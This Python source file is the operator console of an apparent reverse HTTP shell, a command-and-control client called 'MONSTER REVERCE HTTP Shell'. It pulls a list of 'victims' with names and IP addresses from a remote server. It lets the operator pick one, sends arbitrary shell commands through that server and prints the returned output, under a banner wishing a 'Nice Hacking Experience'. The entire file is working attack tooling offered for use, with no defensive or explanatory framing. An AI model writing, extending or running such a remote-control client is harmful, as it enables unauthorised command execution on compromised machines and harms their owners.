from colorama import Fore,Back,Style
from modules.earth import Earth
import requests
import readline #don't remove this 
import time
import json
import os

logo = """
                =====================================================
                |                                                   |
                |             MONSTER REVERCE HTTP Shell            |
                |                                                   |
                =====================================================
"""

class Victim:
    def __init__(self,id,name,ip,created):
        self.id = id
        self.name = name
        self.ip = ip
        self.created = created

class Shell:
    def __init__(self):
        self.server = "https://meterpreter.pythonanywhere.com/"
        self.targets = []
        self.target = None 
        self.decoration = True
        self.timeout = 3
        self.settings = self.load_settings()
        self.apply_settings()


    def load_settings(self):
        with open("settings.json", "r") as f:
            return json.load(f)  
        
    def set_settings(self, settings):
        with open("settings.json", "w") as f:
            json.dump(settings, f, indent=4)

    def apply_settings(self):
        self.server = self.settings["server"]
        self.decoration = self.settings["style"]
        self.timeout = self.settings["timeout"]
        
    def show_sessions(self):
        res = requests.get(f'{self.server}/register/states{'?target='+self.target if self.target else ""}')
        if res.ok:
            sessions = res.json()
            for i,session in enumerate(sessions):
               print(f" {Fore.MAGENTA}{i+1}{Fore.WHITE} | {Fore.GREEN}{session["target"]}{Fore.WHITE} | {Fore.RED}{session["state"]}{Fore.WHITE} | {Fore.CYAN}{session["created"]}{Style.RESET_ALL}")
               
    def make_command(self,prompt):
        data = {
            'target': self.target,
            'command': prompt
        }

        requests.post(f'{self.server}/register/commands', json=data)
        time.sleep(self.timeout)
        res = requests.get(f'{self.server}/register/log?target={self.target}&cmd={prompt}').json()
        return res[0]['log'] if res else res

    def main(self):
        while True:
            command = input(Fore.RED + f"{self.target if self.target else "Meterpreter "} > " + Style.RESET_ALL)
            if command:
                if command in ["exit","quit","q"]:
                    exit()
                if command in ["clear","cls"]:
                    os.system("clear")
                    print(Fore.GREEN + logo + Style.RESET_ALL)
                elif command == "sessions":
                    self.show_sessions()
                elif command == "set target":
                    self.select_target()
                else:
                    print(self.make_command(command) if self.target else Fore.RED + "[-].... You should select target first .....[-]" + Style.RESET_ALL)
            else:
                print(Fore.RED + '[-] ..... You should enter a valid command ..... [-]' + Style.RESET_ALL)
    def select_target(self):
        targets = requests.get(f'{self.server}/register/victime').json()
        for i, target in enumerate(targets):
            self.targets.append(Victim(i, target['name'],target['ip'],target['created']))
            print(f"{i+1} | {target['name']} ({target['ip']}) | {target['created']}")
        try:
            choice = int(input("Select target: "))
        except:
            print("Invalid input!")
            self.select_target()
        if 0 < choice <= len(self.targets):
            self.target = self.targets[choice-1].name
        else:
            print("Invalid selection!")
            self.select_target()

os.system("clear")
sh = Shell()

if sh.decoration:
    Earth()
    print(logo + Style.RESET_ALL)

print(Back.LIGHTGREEN_EX + Fore.RED +"[-]..... Have a Nice Hacking Experience .....[-]"+Style.RESET_ALL+"\n")
sh.main()